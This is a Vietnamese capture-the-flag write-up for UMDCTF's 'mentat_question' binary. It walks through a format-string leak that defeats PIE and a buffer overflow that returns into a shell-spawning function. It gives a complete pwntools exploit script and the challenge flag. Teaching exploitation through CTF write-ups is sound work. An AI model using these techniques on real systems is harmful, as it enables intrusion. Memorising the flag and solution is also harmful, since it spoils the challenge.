# Challenge: mentat_question
## Description

![image](https://github.com/sangnguyenthien/CTF/assets/89742084/e397fe32-f9bc-43da-bbb7-e8d85e5532f0)

## Source 
> mentat_question

> mentat_question.cpp

> Dockerfile

## Solution

Đầu tiên hãy xem thử source code C++:

![image](https://github.com/sangnguyenthien/CTF/assets/89742084/3074f806-29c2-4987-8bb9-9a1a5cadf5f1)

![image](https://github.com/sangnguyenthien/CTF/assets/89742084/c0c78e0a-36be-4f3c-83ec-8dd75c00e334)

Ở đây chúng ta có 2 lỗi: Buffer overflow (dòng 19, trong hàm calculate) và Format string (dòng 22, trong hàm calculate).

Hàm secret() cho chúng ta 1 cái shell. Một bài ret2win.
Tiếp theo hãy kiểm tra file thực thi bằng checksec

![image](https://github.com/sangnguyenthien/CTF/assets/89742084/86d80200-a24f-46f4-ae06-f16ed6ec1629)

Được bảo vệ bằng PIE -> Muốn return về hàm secret() thì chúng ta phải biết được địa chỉ code base -> Có thể leak bằng Format string.

Vậy ý tưởng của bài này là, đầu tiên tận dụng Format string trong hàm calculate để lấy được code base, tính toán ra địa chỉ của secret(). Sau đó, lại nhảy vào hàm calculate lần nữa. Lần này là để dùng Buffer overflow, ghi đè địa chỉ trả về trên stack của hàm calculate thành địa chỉ của secret() -> Lấy được shell -> cat flag.txt -> Win. Bắt đầu thôi!

Để "vào" được hàm calculate() mà cụ thể hơn là dòng 22 (nơi có lỗi Format string), thì chúng ta cần input:
- Với num1, bạn có thể nhập số nào cũng được, miễn là không âm.
- Với num2, nếu bạn xem qua If (dòng 16) sẽ thấy num2 phải bé hơn (<) 1. Mà num2 lại không âm -> num2 = 0. Nhưng xem lại If ở dòng 55 thì sẽ thấy nó check kí tự đầu của input (cho num2), nếu bằng 0 thì return luôn. Cái này có thể dễ dàng vượt qua bằng cách nhập 1 kí tự bất kì khác với kí tự "0" + kí tự "0" ví dụ "a0". Nó sẽ check và thấy: à ok "a" khác "0" -> pass, sau đó num2 = atoi(...) -> num2 = 0.
- Sau khi nhập xong num1, num2. Để có thể thực thi câu lệnh có lỗi Format string, ta cần pass 3 kí tự đầu là "Yes", sau đó là tùy ý ("%p" chẳng hạn). Lưu ý là có 1 câu lệnh getc() ở dòng 54, nên trong code giải tôi sẽ thêm 1 kí tự bất kì trước Yes ^^ Đừng bận tâm.
- Ok để leak thì chúng ta cần xem xem stack nó có cái giá trị nào mà mình có thể tận dụng được không. Hãy dùng GDB (set breakpoint ở câu lệnh printf(buf))

![image](https://github.com/sangnguyenthien/CTF/assets/89742084/7ea835ed-945f-4ba6-bfaa-7681c989bd83)

- Format string là 1 lỗi khá là "quyền năng". Tôi sẽ leak cái giá trị trên địa chỉ **+0x0028**.
- Vậy chúng ta sẽ dùng "%**x**$p". Nhưng **x** là bao nhiêu. Cái này liên quan đến x86-64 calling convention. Tức là: ví dụ printf("%p %p %p %p %p %p"). Thì nó sẽ in lần lượt tương ứng với mỗi %p là giá trị trên thanh ghi rsi, rdx, rcx, r8, r9. Khi thanh ghi bị dùng hết thì mới đến các giá trị trên stack. Tức là %p thứ 6 sẽ là giá trị trên stack.

![image](https://github.com/sangnguyenthien/CTF/assets/89742084/9bf57551-e4b6-47d3-9d99-3174cdcb55bd)


![image](https://github.com/sangnguyenthien/CTF/assets/89742084/4d0d72d3-c792-4424-b6ae-da28a1f7c276)


Chúng ta sẽ bắt đầu đếm **x** với địa chỉ **+0x0000** bắt đầu **x**=6 -> đến **+0x0028** thì **x** sẽ bằng 11. -> Thứ chúng ta cần input là "0Yes %11$p"

Trên GDB, gõ "ni".

![image](https://github.com/sangnguyenthien/CTF/assets/89742084/4de0f903-89a6-41b6-b11c-7b31e340de27)

Oke, đúng rồi.
Việc còn lại chỉ là tính toán địa chỉ code base -> địa chỉ secret() và ghi đè.

 

**Code giải:**

Bạn có thể dùng cyclic để tính offset sau đó ghi đè return address của hàm calculate. Ở trong code giải thì tôi có cho thêm một cái "ret" gadget trước khi gọi system() để căn chỉnh stack (Về địa chỉ của "ret" thì mọi người có thể dùng ropper hoặc ROPGadget để tìm).

Stack Alignment: https://ir0nstone.gitbook.io/notes/types/stack/return-oriented-programming/stack-alignment

```python
from pwn import *


#pwn/mentat-question
#UMDCTF{3_6u1ld_n4v16470r5_4_7074l_0f_1.46_m1ll10n_62_50l4r15_r0und_7r1p}

context.binary = exe = ELF("./mentat-question")

#p = process(exe.path)
p = remote("challs.umdctf.io", 32300)

input()

p.sendlineafter(b"today?\n", b"Division")

p.sendlineafter(b"divided?", b"6")

p.sendline(b"a0")

p.sendline(b"0Yes %11$p")

p.recvuntil(b"Yes ")

leak_addr = int(p.recvuntil(b" I heard", drop=True), 16)

print(hex(leak_addr))

base_addr = leak_addr - (0x55555555545c-0x0000555555554000)
print(hex(base_addr))

secret_addr = base_addr + 0x11d9
ret_gadget = base_addr + 0x101a
p.sendline(b"6")
p.sendline(b"a0")

payload = b"0Yes "
payload += b"A"*20
payload += p64(ret_gadget)
payload += p64(secret_addr)
#payload += b"aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaa"

p.sendline(payload)
p.interactive()
```



